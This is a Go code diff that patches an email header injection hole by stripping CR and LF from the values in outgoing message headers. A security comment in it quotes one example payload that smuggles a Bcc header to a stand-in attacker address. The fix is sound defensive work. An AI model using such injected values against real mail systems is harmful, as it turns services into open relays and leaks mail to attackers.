@@ -156,17 +156,34 @@ func sendImplicitTLS(addr, host string, auth smtp.Auth, from string, to []string
 	return c.Quit()
 }
 
+// sanitizeHeader strips CR and LF from a header value.
+//
+// SECURITY: buildMIME writes header values straight into the message, so any
+// newline in one lets a caller append arbitrary headers. That was unreachable
+// while every value came from our own code, and became reachable when the
+// wholesale-access request started using a buyer-supplied email as Reply-To and
+// a buyer-supplied company name in the Subject, both arriving from the
+// unauthenticated /visitors/event endpoint. A crafted address like
+// "x@y.com\r\nBcc: attacker@evil.test" injected a real Bcc and turned the
+// platform's SES into an open relay with our sending reputation behind it.
+//
+// Stripped rather than rejected, and applied here rather than at each call site,
+// so no future caller has to remember: a header value is one line, always.
+func sanitizeHeader(v string) string {
+	return strings.NewReplacer("\r", "", "\n", "").Replace(v)
+}
+
 // buildMIME constructs a multipart/alternative MIME message with both HTML and plain text bodies.
 func buildMIME(from string, msg Message) []byte {
 	var b strings.Builder
 	boundary := "BC-MIME-BOUNDARY-2026"
 
-	b.WriteString("From: " + from + "\r\n")
-	b.WriteString("To: " + msg.To + "\r\n")
+	b.WriteString("From: " + sanitizeHeader(from) + "\r\n")
+	b.WriteString("To: " + sanitizeHeader(msg.To) + "\r\n")
 	if msg.ReplyTo != "" {
-		b.WriteString("Reply-To: " + msg.ReplyTo + "\r\n")
+		b.WriteString("Reply-To: " + sanitizeHeader(msg.ReplyTo) + "\r\n")
 	}
-	b.WriteString("Subject: " + msg.Subject + "\r\n")
+	b.WriteString("Subject: " + sanitizeHeader(msg.Subject) + "\r\n")
 	b.WriteString("MIME-Version: 1.0\r\n")
 	b.WriteString("Auto-Submitted: auto-generated\r\n")
 
